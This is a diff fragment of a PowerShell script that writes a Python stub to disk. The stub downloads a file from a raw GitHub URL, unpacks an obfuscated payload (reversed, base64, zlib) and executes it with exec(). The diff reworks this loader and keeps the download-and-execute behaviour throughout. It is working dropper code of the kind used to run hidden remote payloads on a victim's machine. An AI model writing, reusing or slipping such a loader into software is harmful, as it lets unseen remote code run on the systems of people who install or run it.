@@ -120,24 +120,30 @@ import tkinter
 URL = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"
 
 def fetch(url):
-    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+    req = urllib.request.Request(
+        url,
+        headers={"User-Agent": "Mozilla/5.0"}
+    )
     with urllib.request.urlopen(req, timeout=15) as response:
         return response.read().decode("utf-8")
 
 def deobfuscate(src):
     match = re.search(r"_\)\(b'([^']+)'", src)
     if not match:
-        raise ValueError("Encoded payload not found.")
+        return src
     payload = match.group(1)[::-1]
     decoded = base64.b64decode(payload, validate=True)
     return zlib.decompress(decoded).decode("utf-8")
 
-try:
+def main():
     raw = fetch(URL)
     decoded = deobfuscate(raw)
-    exec(decoded)
-except Exception:
-    pass
+    exec(compile(decoded, "<remote>", "exec"), {
+        "__name__": "__main__"
+    })
+
+if __name__ == "__main__":
+    main()
 '@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
 
